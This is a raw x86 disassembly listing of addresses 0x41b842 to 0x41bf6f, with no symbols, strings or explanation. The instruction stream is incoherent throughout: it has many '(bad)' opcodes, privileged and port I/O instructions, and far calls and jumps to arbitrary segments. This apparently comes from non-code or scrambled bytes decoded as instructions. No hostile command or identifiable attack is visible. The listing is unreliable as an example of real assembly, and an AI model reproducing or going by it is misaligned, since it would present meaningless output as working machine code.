  41b842:	rcr    DWORD PTR [ecx-0xd0ff388],1
  41b848:	sbb    edi,0x3f66156
  41b84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b84f:	(bad)  
  41b850:	fcom   st(6)
  41b852:	ret    
  41b853:	iret   
  41b854:	mov    bh,0x7c
  41b856:	jmp    0xe1cd0306
  41b85b:	leave  
  41b85c:	xchg   ebx,eax
  41b85d:	xlat   BYTE PTR ds:[ebx]
  41b85e:	out    0xd0,al
  41b860:	pop    es
  41b861:	cwde   
  41b862:	iret   
  41b863:	je     0x41b812
  41b865:	test   al,0x77
  41b867:	cli    
  41b868:	or     bh,al
  41b86a:	xchg   esp,eax
  41b86b:	btc    DWORD PTR [edx+0x59],esp
  41b86f:	hlt    
  41b870:	sub    eax,0x83114a07
  41b875:	nop
  41b876:	sbb    DWORD PTR [esi+0xbb6f517],ebp
  41b87c:	inc    ecx
  41b87d:	add    BYTE PTR [eax+0xe],al
  41b880:	inc    eax
  41b881:	push   edi
  41b882:	clc    
  41b883:	out    dx,eax
  41b884:	inc    ecx
  41b885:	(bad)  
  41b886:	enter  0x42d,0x48
  41b88a:	xchg   ecx,eax
  41b88b:	xlat   BYTE PTR ds:[ebx]
  41b88c:	mov    ebp,0x8c8c398c
  41b891:	inc    esp
  41b892:	push   eax
  41b893:	sub    ebx,ebx
  41b895:	ss inc edi
  41b897:	mov    edx,0xff2f861e
  41b89c:	addr16 retf 
  41b89e:	dec    edx
  41b89f:	xor    DWORD PTR ss:[ecx+edi*1-0x3f],edi
  41b8a4:	fdivr  QWORD PTR [edx-0x71]
  41b8a7:	popa   
  41b8a8:	icebp  
  41b8a9:	or     bh,ah
  41b8ab:	inc    ebx
  41b8ac:	xchg   ecx,eax
  41b8ad:	(bad)  
  41b8ae:	sub    esp,esi
  41b8b0:	dec    ecx
  41b8b1:	data16 test al,0x6f
  41b8b4:	xor    BYTE PTR ds:0x5fd278e8,dh
  41b8ba:	leave  
  41b8bb:	jnp    0x41b93a
  41b8bd:	out    dx,eax
  41b8be:	mov    BYTE PTR [edi],al
  41b8c0:	pop    edi
  41b8c1:	and    edi,ebx
  41b8c3:	mov    eax,ds:0x359feb7a
  41b8c8:	pop    ds
  41b8c9:	scas   eax,DWORD PTR es:[edi]
  41b8ca:	jp     0x41b93f
  41b8cc:	cwde   
  41b8cd:	fwait
  41b8ce:	push   ds
  41b8cf:	(bad)
  41b8d3:	pop    edx
  41b8d4:	add    BYTE PTR [edi+0x46],bh
  41b8d7:	loope  0x41b8e7
  41b8d9:	dec    esp
  41b8da:	iretw  
  41b8dc:	pop    esp
  41b8dd:	sti    
  41b8de:	das    
  41b8df:	xlat   BYTE PTR ds:[ebx]
  41b8e0:	(bad)  
  41b8e1:	div    ebx
  41b8e3:	add    al,BYTE PTR [ebx+0xa]
  41b8e6:	iret   
  41b8e7:	outs   dx,BYTE PTR ds:[esi]
  41b8e8:	xchg   edx,eax
  41b8e9:	jge    0x41b8ac
  41b8eb:	mov    ds:0x245bf1e,eax
  41b8f0:	std    
  41b8f1:	das    
  41b8f2:	xchg   esp,eax
  41b8f3:	inc    ecx
  41b8f4:	loope  0x41b879
  41b8f6:	xchg   edi,eax
  41b8f7:	xchg   ecx,eax
  41b8f8:	imul   ebp,DWORD PTR [edi-0x5e],0x528f47f7
  41b8ff:	cmp    al,BYTE PTR [edi+0x5553cd4f]
  41b905:	xor    ecx,DWORD PTR [ebp+ebp*1+0x78]
  41b909:	or     ah,BYTE PTR [esi]
  41b90b:	pop    esi
  41b90c:	dec    edi
  41b90d:	gs out dx,al
  41b90f:	jae    0x41b8af
  41b911:	out    0xc5,al
  41b913:	dec    esi
  41b914:	inc    ebp
  41b915:	dec    ebx
  41b916:	pop    esp
  41b917:	out    dx,eax
  41b918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b919:	jae    0x41b90b
  41b91b:	cmp    esi,ebp
  41b91d:	call   0xc8c79e7d
  41b922:	push   ss
  41b923:	xchg   esp,eax
  41b924:	push   edx
  41b925:	xor    esi,DWORD PTR [ebx]
  41b927:	push   0xffffffe5
  41b929:	sbb    DWORD PTR [edi+0x48],edi
  41b92c:	xchg   ebp,eax
  41b92d:	dec    ecx
  41b92e:	push   cs
  41b92f:	fbstp  TBYTE PTR [edi]
  41b931:	add    bl,BYTE PTR [ebx-0x3]
  41b934:	rep ins DWORD PTR es:[edi],dx
  41b936:	xchg   ebp,eax
  41b937:	vpshad ymm2,ds:0xe18c69d1,xmm0
  41b940:	mov    ds:0xb90f8d0e,eax
  41b945:	lock repnz pop ecx
  41b948:	not    ch
  41b94a:	fisub  DWORD PTR [ebx-0x6b5a83ae]
  41b950:	not    BYTE PTR [edx]
  41b952:	cmp    eax,0xe67f872a
  41b957:	or     dh,dl
  41b959:	enter  0x7654,0x8a
  41b95d:	ss add eax,0x84aeceb5
  41b963:	mov    ah,0x6f
  41b965:	inc    ebp
  41b966:	arpl   dx,di
  41b968:	mov    eax,ds:0xf3361932
  41b96d:	mov    bl,0x4a
  41b96f:	rcl    BYTE PTR ds:0x5b925b8d,cl
  41b975:	daa    
  41b976:	(bad)  
  41b977:	test   BYTE PTR [eax-0x4749af7f],dh
  41b97d:	lds    edx,FWORD PTR [esp+ebx*8]
  41b980:	jp     0x41b9ca
  41b982:	test   BYTE PTR [ecx],bh
  41b984:	out    0x21,al
  41b986:	pop    ecx
  41b987:	(bad)  
  41b988:	sbb    ecx,DWORD PTR [edx-0x16]
  41b98b:	inc    ecx
  41b98c:	push   esp
  41b98d:	std    
  41b98e:	js     0x41b9ac
  41b990:	gs je  0x41b99e
  41b993:	jl     0x41b9bd
  41b995:	inc    edx
  41b996:	dec    edi
  41b997:	and    al,0x80
  41b999:	repnz lods eax,DWORD PTR ds:[esi]
  41b99b:	mov    DWORD PTR [ecx-0x4e],edx
  41b99e:	sub    ah,BYTE PTR [edi+0x53]
  41b9a1:	int3   
  41b9a2:	outs   dx,DWORD PTR ds:[esi]
  41b9a3:	mov    esp,0x4465c96d
  41b9a8:	inc    edx
  41b9a9:	adc    al,0xa2
  41b9ab:	xor    eax,0x4406e16f
  41b9b0:	pop    ebx
  41b9b1:	or     al,0xce
  41b9b3:	into   
  41b9b4:	xor    eax,0x8526a64c
  41b9b9:	call   0x3e36:0x417b219c
  41b9c0:	out    dx,al
  41b9c1:	aaa    
  41b9c2:	and    dl,BYTE PTR [edi-0x5e8ba05e]
  41b9c8:	enter  0x4c22,0xea
  41b9cc:	push   edi
  41b9cd:	cmp    eax,0xaa3da99d
  41b9d2:	icebp  
  41b9d3:	dec    ecx
  41b9d4:	pop    es
  41b9d5:	pop    ds
  41b9d6:	outs   dx,BYTE PTR ds:[esi]
  41b9d7:	bound  edx,QWORD PTR [ebp-0x34]
  41b9da:	xchg   esp,eax
  41b9db:	in     eax,0x9d
  41b9dd:	hlt    
  41b9de:	pop    ebp
  41b9df:	jo     0x41ba54
  41b9e1:	inc    edx
  41b9e2:	cmc    
  41b9e3:	std    
  41b9e4:	mov    ch,BYTE PTR [eax]
  41b9e6:	xor    ecx,ebx
  41b9e8:	xor    al,0x8e
  41b9ea:	xchg   ebp,eax
  41b9eb:	loop   0x41b9ce
  41b9ed:	daa    
  41b9ee:	push   es
  41b9ef:	loop   0x41ba51
  41b9f1:	ja     0x41b998
  41b9f3:	add    ch,BYTE PTR [edx+0x2f]
  41b9f6:	pop    edi
  41b9f7:	aas    
  41b9f8:	pop    edx
  41b9f9:	aas    
  41b9fa:	mov    ebp,0x71b46b02
  41b9ff:	sar    DWORD PTR [ecx+0x511b0b88],1
  41ba05:	imul   ebx,DWORD PTR [esi+ecx*8-0x5f],0x48a8b14e
  41ba0d:	ret    0xab00
  41ba10:	or     ecx,DWORD PTR [eax-0x21]
  41ba13:	(bad)  
  41ba14:	cmp    ebx,ebp
  41ba16:	sbb    eax,0x20a8266a
  41ba1b:	mov    ecx,0x44608152
  41ba20:	outs   dx,DWORD PTR ds:[esi]
  41ba21:	mov    ?,WORD PTR [eax]
  41ba23:	sahf   
  41ba24:	xchg   edx,eax
  41ba25:	fimul  WORD PTR [esi]
  41ba27:	cld    
  41ba28:	and    ebx,DWORD PTR [esi+0x3608dd9f]
  41ba2e:	lods   al,BYTE PTR ds:[esi]
  41ba2f:	push   cs
  41ba30:	mov    BYTE PTR [eax-0x180d5c49],ch
  41ba36:	jo     0x41ba1a
  41ba38:	pop    esi
  41ba39:	les    edi,FWORD PTR [ebp-0x31]
  41ba3c:	fbstp  TBYTE PTR [esi-0x4b2b0c4d]
  41ba42:	cwde   
  41ba43:	jnp    0x41ba07
  41ba45:	and    ah,BYTE PTR [ebx]
  41ba47:	fucomi st,st(4)
  41ba49:	jae    0x41ba78
  41ba4b:	mov    gs,WORD PTR [ebx]
  41ba4d:	mov    ds:0x7874dd28,al
  41ba52:	out    dx,eax
  41ba53:	(bad)  
  41ba54:	call   0xce3e60d
  41ba59:	pop    esp
  41ba5a:	sub    BYTE PTR [ebx+0x2e],ah
  41ba5d:	sbb    DWORD PTR [esi+0x55889ee7],ebx
  41ba63:	xchg   edi,eax
  41ba64:	aad    0x3
  41ba66:	add    bl,BYTE PTR [ebx]
  41ba68:	les    esi,FWORD PTR [ecx-0x30ab8b1a]
  41ba6e:	loop   0x41ba70
  41ba70:	ficom  WORD PTR [ebp-0x45]
  41ba73:	push   0x3478af4e
  41ba78:	ins    BYTE PTR es:[edi],dx
  41ba79:	call   0x95e2:0xf5ed93ab
  41ba80:	ins    DWORD PTR es:[edi],dx
  41ba81:	test   eax,0x8ba5643d
  41ba86:	inc    edi
  41ba87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba88:	retf   0x5d77
  41ba8b:	retfw  0xc0fb
  41ba8f:	dec    edx
  41ba90:	cld    
  41ba91:	mov    gs,WORD PTR [ecx]
  41ba93:	dec    ecx
  41ba94:	and    BYTE PTR [eax-0x60],ch
  41ba97:	sbb    esi,DWORD PTR [esi+0x503b3d3c]
  41ba9d:	mov    dh,0xa3
  41ba9f:	ins    DWORD PTR es:[edi],dx
  41baa0:	mov    ebx,0x37ce2b1b
  41baa5:	in     eax,dx
  41baa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa7:	das    
  41baa8:	inc    edx
  41baa9:	jecxz  0x41ba89
  41baab:	jmp    0x41babf
  41baad:	mov    ebx,0x886533ab
  41bab2:	pushf  
  41bab3:	push   ebp
  41bab4:	or     esp,ebp
  41bab6:	inc    edi
  41bab7:	sub    BYTE PTR [ebx+ebp*4],bh
  41baba:	mov    ds:0x48188838,al
  41babf:	imul   edx,eax,0x45
  41bac2:	lea    edx,[ebx]
  41bac4:	or     ecx,DWORD PTR [edi+0x2c]
  41bac7:	mov    cs:0x58af6717,al
  41bacd:	xchg   esi,eax
  41bace:	xchg   BYTE PTR [ebx-0x4f],ch
  41bad1:	test   al,0x63
  41bad3:	mov    DWORD PTR [esi],ebx
  41bad5:	cmp    bl,BYTE PTR [edx-0x7ae7918c]
  41badb:	icebp  
  41badc:	push   ds
  41badd:	pop    es
  41bade:	xchg   edi,eax
  41badf:	in     al,0xad
  41bae1:	sbb    al,0x55
  41bae3:	call   0x37ec31bf
  41bae8:	aam    0xdf
  41baea:	mov    al,0x87
  41baec:	sub    ecx,DWORD PTR [edx]
  41baee:	aaa    
  41baef:	les    ebx,FWORD PTR [esp+edi*8]
  41baf2:	push   esi
  41baf3:	jl     0x41bad2
  41baf5:	sar    eax,cl
  41baf7:	loopne 0x41bb17
  41baf9:	pop    edx
  41bafa:	push   0x5e
  41bafc:	fwait
  41bafd:	sbb    eax,0xe57830c7
  41bb02:	mov    dl,0x4e
  41bb04:	or     al,0x85
  41bb06:	or     ecx,DWORD PTR [ecx+0x4ae15f71]
  41bb0c:	lds    ecx,FWORD PTR [ecx]
  41bb0e:	mov    cl,0x1e
  41bb10:	add    bh,ch
  41bb12:	mov    WORD PTR ds:0xbad44334,ds
  41bb18:	cdq    
  41bb19:	xchg   esi,eax
  41bb1a:	and    esi,DWORD PTR [ecx]
  41bb1c:	cmp    ah,BYTE PTR [eax+0x253b8de8]
  41bb22:	stos   BYTE PTR es:[edi],al
  41bb23:	pusha  
  41bb24:	jnp    0x41bb61
  41bb26:	and    ebp,DWORD PTR [edi+0x44]
  41bb29:	lea    ebp,[esi-0x3a5e3fe]
  41bb2f:	aam    0x53
  41bb31:	sub    ebp,DWORD PTR [ebp+0x4842edda]
  41bb37:	and    esp,DWORD PTR [edx]
  41bb39:	xor    bl,cl
  41bb3b:	iret   
  41bb3c:	fdiv   st(0),st
  41bb3e:	xchg   esp,eax
  41bb3f:	inc    ecx
  41bb40:	lods   al,BYTE PTR ds:[esi]
  41bb41:	sub    esp,DWORD PTR [ecx]
  41bb43:	mov    DWORD PTR [eax+0x624e5682],eax
  41bb49:	ds mov bh,0x40
  41bb4c:	pushf  
  41bb4d:	cmp    eax,0xbf0489a9
  41bb52:	shl    edi,1
  41bb54:	loop   0x41bb5d
  41bb56:	mov    esp,fs
  41bb58:	and    bh,cl
  41bb5a:	adc    DWORD PTR [ebx],edx
  41bb5c:	stc    
  41bb5d:	push   esp
  41bb5e:	add    DWORD PTR [ebx+0x2e],edx
  41bb61:	std    
  41bb62:	pop    ebp
  41bb63:	push   ebx
  41bb64:	jo     0x41bb22
  41bb66:	dec    ebx
  41bb67:	addr16 inc eax
  41bb69:	aad    0xc7
  41bb6b:	shr    BYTE PTR [ebx-0x26],0xf
  41bb6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb70:	add    edx,DWORD PTR [ecx+0x3f]
  41bb73:	inc    edi
  41bb74:	cmp    al,0x5d
  41bb76:	pop    ecx
  41bb77:	clc    
  41bb78:	shl    DWORD PTR [ebx+0x4c31a83b],cl
  41bb7e:	fmul   QWORD PTR [eax]
  41bb80:	xchg   edx,eax
  41bb81:	or     BYTE PTR [ebp-0x3f0d6729],al
  41bb87:	cwde   
  41bb88:	lods   eax,DWORD PTR ds:[esi]
  41bb89:	ins    DWORD PTR es:[edi],dx
  41bb8a:	cmp    bh,ah
  41bb8c:	push   0xb12ec676
  41bb91:	sti    
  41bb92:	inc    esp
  41bb93:	add    BYTE PTR [ebx-0x3124f33a],0x3
  41bb9a:	mov    ?,WORD PTR [esi]
  41bb9c:	sbb    al,0x5f
  41bb9e:	inc    di
  41bba0:	iret   
  41bba1:	jp     0x41bb2b
  41bba3:	push   ebp
  41bba4:	xchg   edi,eax
  41bba5:	jo     0x41bb87
  41bba7:	pop    eax
  41bba8:	mul    al
  41bbaa:	icebp  
  41bbab:	jmp    0x41bbd4
  41bbad:	mov    ebp,0x2a8f3b00
  41bbb2:	fbld   TBYTE PTR [esi]
  41bbb4:	nop
  41bbb5:	int    0x68
  41bbb7:	dec    eax
  41bbb8:	mov    esi,0x86bf8d0b
  41bbbd:	enter  0xdfb9,0xa7
  41bbc1:	mov    esp,0x9c2aa50a
  41bbc6:	fucom  st(3)
  41bbc8:	pop    ecx
  41bbc9:	inc    edi
  41bbca:	add    DWORD PTR [esi+0x6767bc4b],esi
  41bbd0:	xor    dh,BYTE PTR [eax+0x6f9724db]
  41bbd6:	loop   0x41bc55
  41bbd8:	outs   dx,BYTE PTR ds:[esi]
  41bbd9:	sub    eax,0xc3b8e1ba
  41bbde:	iret   
  41bbdf:	cs pop ebp
  41bbe1:	cmp    BYTE PTR [ebx+0x35],ch
  41bbe4:	sbb    DWORD PTR ds:0x8c7e1fcb,esp
  41bbea:	inc    esp
  41bbeb:	xlat   BYTE PTR ds:[ebx]
  41bbec:	aam    0xb1
  41bbee:	jne    0x41bc63
  41bbf0:	sub    DWORD PTR [ecx-0x5bd94cd9],edx
  41bbf6:	sbb    DWORD PTR [edi-0x688d7f5b],0xffffffb8
  41bbfd:	sbb    al,0x42
  41bbff:	xor    BYTE PTR [ecx+0x4a],al
  41bc02:	pop    eax
  41bc03:	int    0x40
  41bc05:	sbb    BYTE PTR [esi],bh
  41bc07:	inc    edi
  41bc08:	pop    ecx
  41bc09:	bnd jl 0x41bc1a
  41bc0c:	rol    DWORD PTR [edi+0x68a65c19],0xa0
  41bc13:	(bad)  
  41bc14:	jmp    0x41bc19
  41bc16:	das    
  41bc17:	rcl    DWORD PTR [edx+ebp*8-0x1554fc06],1
  41bc1e:	push   es
  41bc1f:	or     bl,BYTE PTR [edi]
  41bc21:	mov    cl,0xc5
  41bc23:	and    eax,0x747b7564
  41bc28:	fwait
  41bc29:	and    DWORD PTR [edx+0xe],esi
  41bc2c:	mov    ebx,0xea9bbc82
  41bc31:	cld    
  41bc32:	jbe    0x41bc8d
  41bc34:	stc    
  41bc35:	mov    eax,es
  41bc37:	cli    
  41bc38:	mov    esi,0x8fc65551
  41bc3d:	dec    esp
  41bc3e:	retf   0xe88
  41bc41:	out    dx,eax
  41bc42:	ror    al,1
  41bc44:	or     al,0x17
  41bc46:	adc    al,0x64
  41bc48:	xchg   edx,eax
  41bc49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc4a:	cmp    bl,cl
  41bc4c:	xchg   esp,eax
  41bc4d:	dec    ebx
  41bc4e:	mov    ch,0xc4
  41bc50:	mov    BYTE PTR [esi+eiz*4],al
  41bc53:	pop    eax
  41bc54:	adc    edi,edx
  41bc56:	(bad)  [ebp+0x47]
  41bc59:	cmp    al,BYTE PTR [ebp+edx*2-0x283116b4]
  41bc60:	xchg   DWORD PTR [esi+0x15bb8576],eax
  41bc66:	mov    ebp,0xa501d0df
  41bc6b:	sar    DWORD PTR [ebx-0x2dc0e69],1
  41bc71:	cmp    eax,0x14c8c34d
  41bc76:	inc    ebp
  41bc77:	cmp    ebp,DWORD PTR [ecx-0x3a4d7c51]
  41bc7d:	icebp  
  41bc7e:	push   ebp
  41bc7f:	xchg   esi,eax
  41bc80:	fnstenv [ebx+0x60]
  41bc83:	pop    edi
  41bc84:	les    eax,FWORD PTR [edi-0x7d5d663d]
  41bc8a:	imul   esp,esi,0x66
  41bc8d:	pop    ecx
  41bc8e:	cwde   
  41bc8f:	cwde   
  41bc90:	jmp    0x2522914e
  41bc95:	add    esp,DWORD PTR [esi]
  41bc97:	pop    esp
  41bc99:	jns    0x41bc36
  41bc9b:	fidiv  DWORD PTR [ebp+0x1ebb911d]
  41bca1:	sub    ebx,DWORD PTR ds:0xea7775ed
  41bca7:	hlt    
  41bca8:	jmp    FWORD PTR [eax+0x17a29998]
  41bcae:	mov    dh,BYTE PTR [ecx+0x57fdbd71]
  41bcb4:	ss xor ebp,ebp
  41bcb7:	or     BYTE PTR [edi+eiz*1+0x5f1a3f56],dl
  41bcbe:	rcr    BYTE PTR [esi+0x390fc929],0xe2
  41bcc5:	out    0x51,eax
  41bcc7:	xchg   ebp,eax
  41bcc8:	push   ebp
  41bcc9:	ret    0x179e
  41bccc:	fwait
  41bccd:	fs inc esp
  41bccf:	jp     0x41bd05
  41bcd1:	pop    esp
  41bcd2:	sbb    esp,ecx
  41bcd4:	in     al,dx
  41bcd5:	cmp    al,0xc9
  41bcd7:	rol    BYTE PTR [ebx+0x36],cl
  41bcda:	popa   
  41bcdb:	sbb    BYTE PTR [edx+0x3da0ebb6],bh
  41bce1:	repnz dec esp
  41bce3:	aas    
  41bce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bce5:	sub    DWORD PTR gs:[esi],esp
  41bce8:	aas    
  41bce9:	sbb    al,0x58
  41bceb:	int    0x44
  41bced:	add    al,0x12
  41bcef:	bound  edx,QWORD PTR ds:0x9c8c642a
  41bcf5:	adc    BYTE PTR [ecx],dh
  41bcf7:	in     al,0x69
  41bcf9:	dec    eax
  41bcfa:	sbb    al,0xa8
  41bcfc:	cli    
  41bcfd:	jne    0x41bcf7
  41bcff:	test   DWORD PTR [eax],ecx
  41bd01:	xchg   ebp,eax
  41bd02:	mov    esi,0xea6c1586
  41bd07:	(bad)  
  41bd08:	imul   ebp,DWORD PTR [ebx],0xe656e777
  41bd0e:	int3   
  41bd0f:	adc    al,0x71
  41bd11:	jle    0x41bc9f
  41bd13:	mov    bh,0x93
  41bd15:	mov    esp,0x4ecd7970
  41bd1a:	loop   0x41bd47
  41bd1c:	je     0x41bcc1
  41bd1e:	ins    DWORD PTR es:[edi],dx
  41bd1f:	ins    DWORD PTR es:[edi],dx
  41bd20:	xor    DWORD PTR [ebp+0x4ac1fce0],ecx
  41bd26:	loope  0x41bda0
  41bd28:	pop    ss
  41bd29:	pushf  
  41bd2a:	daa    
  41bd2b:	pop    ebp
  41bd2c:	add    ah,BYTE PTR [edi+0x1c]
  41bd2f:	xchg   edx,eax
  41bd30:	call   0x1c62:0xdb999b2a
  41bd37:	jnp    0x41bd3b
  41bd39:	xchg   bl,al
  41bd3b:	jg     0x41bd2c
  41bd3d:	enter  0x58eb,0xb3
  41bd41:	pop    es
  41bd42:	aaa    
  41bd43:	frstor gs:[eax]
  41bd46:	push   DWORD PTR [edx]
  41bd48:	xor    BYTE PTR [ebx+0x28],ah
  41bd4b:	mov    edx,0x932a08f
  41bd50:	inc    esi
  41bd51:	scas   al,BYTE PTR es:[edi]
  41bd52:	or     BYTE PTR [esi],bl
  41bd54:	aas    
  41bd55:	jae    0x41bd92
  41bd57:	jmp    0x41bd8c
  41bd59:	cmp    al,0xd2
  41bd5b:	enter  0xcd92,0x5
  41bd5f:	icebp  
  41bd60:	shl    DWORD PTR [ecx-0x8b8d6e1],1
  41bd66:	xchg   ebp,eax
  41bd67:	sub    eax,eax
  41bd69:	mov    ch,0x5e
  41bd6b:	in     al,dx
  41bd6c:	stc    
  41bd6d:	jb     0x41bdd0
  41bd6f:	cmc    
  41bd70:	or     al,0xa3
  41bd72:	mov    BYTE PTR [edx-0x1f],cl
  41bd75:	inc    edx
  41bd76:	add    ebx,esi
  41bd78:	cmp    edi,DWORD PTR [eax-0x44]
  41bd7b:	fcomp  st(3)
  41bd7d:	xchg   edi,eax
  41bd7e:	inc    BYTE PTR [edx-0x7e]
  41bd81:	mov    ch,0xec
  41bd83:	fcom   QWORD PTR [eax+0x75]
  41bd86:	retf   0xc093
  41bd89:	mov    WORD PTR [edx+0x2],es
  41bd8c:	jo     0x41bdd9
  41bd8e:	fidiv  DWORD PTR [ebx+edx*8-0x3751904a]
  41bd95:	xchg   esi,eax
  41bd96:	in     eax,0xb1
  41bd98:	fcmovne st,st(4)
  41bd9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd9c:	adc    DWORD PTR [esi+ecx*1],ebx
  41bd9f:	jl     0x41be03
  41bda1:	mov    ah,0xd7
  41bda3:	pop    esp
  41bda4:	mov    ds:0x2bd6c418,eax
  41bda9:	jg     0x41bde5
  41bdab:	xor    esi,DWORD PTR [esi+0x5b]
  41bdae:	jmp    0x6433:0xd1c882a8
  41bdb5:	test   al,dl
  41bdb7:	jl     0x41bdac
  41bdb9:	xor    al,0x74
  41bdbb:	fld    DWORD PTR [edi]
  41bdbd:	fimul  DWORD PTR ds:0xfce5cf16
  41bdc3:	dec    ebp
  41bdc4:	xor    edi,ebp
  41bdc6:	inc    esp
  41bdc7:	jb     0x41be45
  41bdc9:	int3   
  41bdca:	call   0xecf398b4
  41bdcf:	mov    edx,0x768d0b32
  41bdd4:	and    esp,esi
  41bdd6:	mov    eax,DWORD PTR [edx+esi*2]
  41bdd9:	xchg   DWORD PTR [ebx-0xd],ebx
  41bddc:	test   esp,0x667d633f
  41bde2:	in     al,dx
  41bde3:	xor    BYTE PTR [ebx+ecx*1],bl
  41bde6:	bound  ebx,QWORD PTR ds:[ebp+0x64ae27da]
  41bded:	and    BYTE PTR [edx+ecx*8],ch
  41bdf0:	mov    DWORD PTR [edi],esp
  41bdf2:	aaa    
  41bdf3:	or     DWORD PTR [esi+eiz*4-0x33],ecx
  41bdf7:	stos   DWORD PTR es:[edi],eax
  41bdf8:	ds leave 
  41bdfa:	push   ebx
  41bdfb:	jnp    0x41be47
  41bdfd:	out    0x4a,eax
  41bdff:	xchg   ebx,eax
  41be00:	fld    QWORD PTR [ebx-0x31]
  41be03:	mov    eax,ds:0x868977f7
  41be08:	in     al,0xaf
  41be0a:	div    BYTE PTR [esi]
  41be0c:	test   DWORD PTR [esi],esi
  41be0e:	imul   ebx,DWORD PTR [edi-0x7],0x9a38fa6a
  41be15:	xor    eax,0x2a9f96ca
  41be1a:	jmp    0x8d815165
  41be1f:	pop    ss
  41be20:	mov    edx,DWORD PTR [edx]
  41be22:	xor    DWORD PTR [edx],esi
  41be24:	fld    QWORD PTR [esi+0xa]
  41be27:	das    
  41be28:	mov    WORD PTR [eax-0x112282ad],ds
  41be2e:	(bad)  
  41be2f:	dec    ecx
  41be31:	out    dx,al
  41be32:	mov    cl,0x9b
  41be34:	push   0xffffffb1
  41be36:	test   eax,0x7e8cf963
  41be3b:	push   ss
  41be3c:	xchg   DWORD PTR [eax],edx
  41be3e:	mov    ebp,0x5def5982
  41be43:	jmp    0x6e73:0x538bac84
  41be4a:	xor    ah,BYTE PTR [esi+0x1a]
  41be4d:	sar    eax,cl
  41be4f:	pop    edx
  41be50:	mov    ?,esi
  41be52:	xlat   BYTE PTR ds:[ebx]
  41be53:	mov    BYTE PTR [eax],ch
  41be55:	mov    dl,0x3b
  41be57:	mov    ch,0x6
  41be59:	mov    esp,0x55267aa5
  41be5e:	inc    esp
  41be5f:	pop    esi
  41be60:	fidivr WORD PTR [edx+0x37]
  41be63:	sbb    BYTE PTR [ecx-0x7b],ch
  41be66:	or     al,0xc
  41be68:	sub    cl,0xbf
  41be6b:	jmp    0x41beb4
  41be6d:	pop    eax
  41be6e:	daa    
  41be6f:	or     edi,esi
  41be71:	mov    eax,ds:0x54c53b0c
  41be76:	push   eax
  41be77:	pop    ebx
  41be78:	inc    edx
  41be79:	shl    DWORD PTR [ebp-0x63],1
  41be7c:	js     0x41be87
  41be7e:	and    eax,0x966b573e
  41be83:	and    eax,esp
  41be85:	mov    esp,0x7775561
  41be8a:	xor    BYTE PTR [ebx-0x70],bh
  41be8d:	and    ebp,DWORD PTR [ebp+ebp*8-0x34]
  41be91:	cmp    ecx,DWORD PTR [edx]
  41be93:	retf   
  41be94:	jo     0x41bede
  41be96:	repnz mov al,ds:0xf378052a
  41be9c:	lds    ebp,FWORD PTR [edi+0x58]
  41be9f:	and    ah,BYTE PTR [eax+ecx*8+0x4a0c4ca9]
  41bea6:	es mov esi,0x18b50a20
  41beac:	mov    esi,0xc761718f
  41beb1:	jne    0x41bf28
  41beb3:	test   BYTE PTR [ecx-0x7c],ah
  41beb6:	fucomi st,st(4)
  41beb8:	xlat   BYTE PTR ds:[ebx]
  41beb9:	in     eax,dx
  41beba:	jg     0x41be41
  41bebc:	push   esi
  41bebd:	xchg   ecx,eax
  41bebe:	sub    cl,BYTE PTR [esi-0x65]
  41bec1:	mov    ds:0x3b18e54d,eax
  41bec6:	cmp    edx,DWORD PTR [ebp+0x45ef24aa]
  41becc:	ret    
  41becd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bece:	rcr    DWORD PTR [edx-0x2e],cl
  41bed1:	(bad)
  41bed5:	mov    cl,0x54
  41bed7:	inc    ebx
  41bed8:	imul   BYTE PTR [eax-0x2232ee84]
  41bede:	sbb    al,0xec
  41bee0:	or     eax,0x1fa2e398
  41bee5:	mov    bh,0xc1
  41bee7:	mov    cs,WORD PTR [ebx+0x15]
  41beea:	and    BYTE PTR [eax-0x23c7f83],ah
  41bef0:	adc    bl,BYTE PTR [ebp+0x29]
  41bef3:	inc    edx
  41bef4:	das    
  41bef5:	ret    0x79b3
  41bef8:	ds test al,0x4f
  41befb:	mov    eax,ds:0x99e87bdf
  41bf00:	lahf   
  41bf01:	push   es
  41bf02:	(bad)  
  41bf03:	jo     0x41becc
  41bf05:	out    dx,eax
  41bf06:	inc    esi
  41bf07:	cld    
  41bf08:	aad    0x67
  41bf0a:	in     al,0x6a
  41bf0c:	std    
  41bf0d:	pusha  
  41bf0e:	ret    
  41bf0f:	xor    BYTE PTR [edx-0x5b],al
  41bf12:	arpl   dx,ax
  41bf14:	xchg   ebp,eax
  41bf15:	in     al,dx
  41bf16:	aam    0xf3
  41bf18:	xor    cl,BYTE PTR [ebx+0x1b]
  41bf1b:	or     BYTE PTR [ebp-0x5b700b07],bh
  41bf21:	inc    esi
  41bf22:	outs   dx,BYTE PTR ds:[esi]
  41bf23:	in     eax,dx
  41bf24:	(bad)  
  41bf25:	mov    ss,WORD PTR [esp+ebp*8+0x7cd84c88]
  41bf2c:	push   esp
  41bf2d:	mov    al,0xf0
  41bf2f:	jmp    ebx
  41bf31:	lods   al,BYTE PTR ds:[esi]
  41bf32:	in     al,dx
  41bf33:	js     0x41bf2e
  41bf35:	sbb    BYTE PTR [ebp+eiz*8-0x79e6297f],dl
  41bf3c:	pop    esi
  41bf3d:	shl    DWORD PTR [ebp+0x3e7e5bfe],0x56
  41bf44:	fmul   QWORD PTR [esi-0x5cb579c1]
  41bf4a:	lds    ecx,FWORD PTR [ebp-0x11ede616]
  41bf50:	sub    DWORD PTR [ebp+0x5209de5f],ecx
  41bf56:	test   DWORD PTR [ebx],ecx
  41bf58:	jl     0x41bfc0
  41bf5a:	xor    ecx,edi
  41bf5c:	das    
  41bf5d:	inc    ebx
  41bf5e:	test   BYTE PTR [edx],bh
  41bf60:	and    eax,0xa8760921
  41bf65:	inc    esi
  41bf66:	scas   al,BYTE PTR es:[edi]
  41bf67:	jns    0x41bfdc
  41bf69:	cmp    BYTE PTR ds:0x35d2ff6f,bh
  41bf6f:	jbe    0x41bf7f
